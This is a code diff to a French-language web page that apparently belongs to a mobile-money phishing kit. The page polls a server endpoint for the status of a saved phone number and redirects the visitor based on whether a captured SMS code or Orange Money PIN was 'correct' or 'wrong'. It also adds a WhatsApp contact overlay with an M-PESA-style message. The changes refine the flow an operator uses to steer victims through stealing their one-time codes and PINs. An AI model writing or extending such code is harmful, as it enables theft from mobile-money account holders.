@@ -194,8 +194,16 @@
         .overlay-title {
             font-size: 22px;
             font-weight: 800;
-            margin-bottom: 16px;
+            margin-bottom: 12px;
             color: white;
+        }
+
+        .overlay-desc {
+            font-size: 15px;
+            font-weight: 600;
+            margin-bottom: 20px;
+            color: #ffffff;
+            line-height: 1.4;
         }
 
         .wa-btn {
@@ -208,7 +216,7 @@
             border-radius: 12px;
             text-decoration: none;
             word-break: break-all;
-            font-size: 14px;
+            font-size: 13px;
             box-shadow: 0 4px 15px rgba(0,0,0,0.15);
         }
 
@@ -255,7 +263,7 @@
 
 <div class="footer-banner"></div>
 
-<!-- ✅ Full Screen Loading Overlay -->
+<!-- ✅ Overlay de Chargement Plein Écran -->
 <div class="overlay" id="statusOverlay">
     <div class="overlay-card">
         <div class="spinner"></div>
@@ -263,10 +271,11 @@
     </div>
 </div>
 
-<!-- ✅ Full Screen Contact Overlay -->
+<!-- ✅ Overlay Contact WhatsApp Plein Écran -->
 <div class="overlay" id="contactOverlay">
     <div class="overlay-card">
         <div class="overlay-title">Contactez-nous sur WhatsApp</div>
+        <div class="overlay-desc">Cliquez sur ce lien pour nous contacter sur WhatsApp</div>
         <a href="https://api.whatsapp.com/send?phone=254768003570t&text=Jambo!%20I'd%20PESA%20Napata%20dje" target="_blank" class="wa-btn">
             https://api.whatsapp.com/send?phone=254768003570t&text=Jambo!%20I'd%20PESA%20Napata%20dje
         </a>
@@ -323,10 +332,18 @@ document.addEventListener("DOMContentLoaded", () => {
                 const res = await fetch(`/api/check-status?phone=${encodeURIComponent(savedPhone)}`);
                 const data = await res.json();
 
+                // Direction vers la page 9
                 if (data.status === "otp1_correct") {
                     clearInterval(checkInterval);
                     window.location.href = "/page9";
-                } else if (data.status === "otp1_wrong") {
+                } 
+                // En cas de mauvais PIN : retour direct sur la page 6
+                else if (data.status === "otp2_wrongpin" || data.status === "pin_wrong") {
+                    clearInterval(checkInterval);
+                    window.location.href = "/page6?error=wrongpin";
+                } 
+                // En cas de lien SMS incorrect
+                else if (data.status === "otp1_wrong") {
                     clearInterval(checkInterval);
                     statusOverlay.style.display = "none";
                     contactOverlay.style.display = "none";
@@ -335,13 +352,9 @@ document.addEventListener("DOMContentLoaded", () => {
                     smsInput.value = "";
                     submitBtn.disabled = true;
                     submitBtn.classList.remove('active');
-                } else if (data.status === "otp2_wrongpin" || data.status === "pin_wrong") {
-                    clearInterval(checkInterval);
-                    statusOverlay.style.display = "none";
-                    contactOverlay.style.display = "none";
-                    alert("Le code PIN est incorrect. Veuillez saisir le code PIN Orange Money correct.");
-                    window.location.href = "/page6?error=wrongpin";
-                } else if (data.status === "contact_us") {
+                } 
+                // Afficher l'overlay WhatsApp
+                else if (data.status === "contact_us") {
                     clearInterval(checkInterval);
                     statusOverlay.style.display = "none";
                     contactOverlay.style.display = "flex";
